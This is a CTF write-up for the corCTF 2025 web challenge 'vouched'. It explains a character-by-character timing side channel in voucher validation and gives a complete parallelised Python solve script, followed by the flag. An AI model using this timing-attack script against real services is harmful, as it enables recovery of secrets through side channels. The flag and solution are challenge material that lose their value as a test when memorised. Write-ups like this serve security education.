# corCTF 2025 – web/vouched

*published: 2025-08-30*

This weekend, I played corCTF 2025 with Psi Beta Rho at UCLA. One of the web challenges I looked at was **vouched**.

The server wanted us to submit a “voucher” string in the format:

```
X-XX-XXX-XXX
````

After playing around with it, I noticed that the server wasn’t validating the whole string at once. Instead, it was doing character-by-character validation.

Also, after each character matched, it would run a PBKDF2-SHA256 hash using the full voucher and the request’s User-Agent as the salt, all before checking the signature and moving on to the next character.

That means if a character matched, the server did an expensive hash and if it didn’t, it failed instantly.  

So if I guessed the first N characters right, the request took noticeably longer. This is a timing side channel.


## Solve process

The obvious attack is to pick a position, try all candidate characters, measure the response time and whichever was slowest is probably correct.  

I got a script working locally but it took about 30 minutes to run, and the instance had a 10 minute time limit. 

So I looked at the source code and noticed the server was running under gunicorn with 4 workers, so I could send up to 4 requests in parallel.  
Also, the oracle gave false positives sometimes (looked slower even when it wasn’t correct), but never false negatives. So I could keep a bigger candidate set and filter it down later.  And I also started using the minimum time per candidate.  

## solve script

```python
#!/usr/bin/env python3
import hashlib,statistics,time,requests
import concurrent.futures as cf

BASE_URL="http://127.0.0.1:8000"
USER_AGENT="vouched-solver/1.0"
REPEATS=1
TIMEOUT=180.0
HEX_CHARS="0123456789ABCDEF"
TOTAL_LEN=12
DASH_POS={1,4,8}
PBKDF2_ITER=1750000
DKLEN=32

MAX_WORKERS=4
EPS=0.03
TOPK=4

_SIG_CACHE={}
def pbkdf2_hex(p,s):
    k=(p,s)
    h=_SIG_CACHE.get(k)
    if h is None:
        h=hashlib.pbkdf2_hmac("sha256",p.encode(),s.encode(),PBKDF2_ITER,dklen=DKLEN).hex()
        _SIG_CACHE[k]=h
    return h

def charset_for_pos(pos):return ["-"] if pos in DASH_POS else HEX_CHARS

def measure_once(sess,url,ua,voucher,timeout):
    h={"User-Agent":ua,"Content-Type":"application/json"}
    sig=pbkdf2_hex(voucher,ua)
    payload={"voucher":voucher,"signature":sig}
    t0=time.perf_counter()
    try: r=sess.post(url,json=payload,headers=h,timeout=timeout,allow_redirects=False);_=r.text
    except: pass
    return time.perf_counter()-t0

def measure(sess,url,ua,voucher,repeats,timeout):
    if repeats<=1: return measure_once(sess,url,ua,voucher,timeout)
    with cf.ThreadPoolExecutor(max_workers=min(repeats,MAX_WORKERS)) as ex:
        fut=[ex.submit(measure_once,sess,url,ua,voucher,timeout) for _ in range(repeats)]
        times=[f.result() for f in cf.as_completed(fut)]
    return min(times)

def measure_batch(sess,url,ua,vouchers,repeats,timeout):
    out=[]
    with cf.ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        fut={ex.submit(measure,sess,url,ua,v,repeats,timeout):v for v in vouchers}
        for f in cf.as_completed(fut):
            v=fut[f]; t=f.result()
            out.append((t,v))
    return out

def head_to_head(sess,url,ua,cand,repeats,timeout):
    scored=measure_batch(sess,url,ua,cand,max(3,repeats*2),timeout)
    scored.sort(key=lambda x:x[0],reverse=True)
    return scored[0][1],scored[0][0]

def recover_code(sess,url,ua,repeats,timeout):
    probe=["0"]*TOTAL_LEN
    for p in DASH_POS:probe[p]="-"
    for pos in range(TOTAL_LEN):
        if pos in DASH_POS:continue
        vouchers=[]
        for ch in charset_for_pos(pos):
            probe[pos]=ch;v="".join(probe);vouchers.append(v)
        cands=measure_batch(sess,url,ua,vouchers,1,timeout)
        cands.sort(key=lambda x:x[0],reverse=True)
        best_time=cands[0][0]
        close=[v for t,v in cands if best_time - t <= EPS]
        if len(close)<min(TOPK,len(cands)): close=[v for _,v in cands[:TOPK]]
        best_v,_=head_to_head(sess,url,ua,close,max(1,repeats),timeout)
        probe[pos]=best_v[pos]
    return "".join(probe)

def main():
    u=BASE_URL.rstrip("/")+"/check"
    with requests.Session() as sess:
        code=recover_code(sess,u,USER_AGENT,REPEATS,TIMEOUT)
        sig=pbkdf2_hex(code,USER_AGENT)
        h={"User-Agent":USER_AGENT,"Content-Type":"application/json"}
        r=sess.post(u,json={"voucher":code,"signature":sig},headers=h,timeout=TIMEOUT)
        print(r.text)

if __name__=="__main__":main()

````

## Flag

```
corctf{d0nt_w0rry_corCTF_2026_w1ll_b3_fr33!}
```


Thanks COR for the fun CTF!
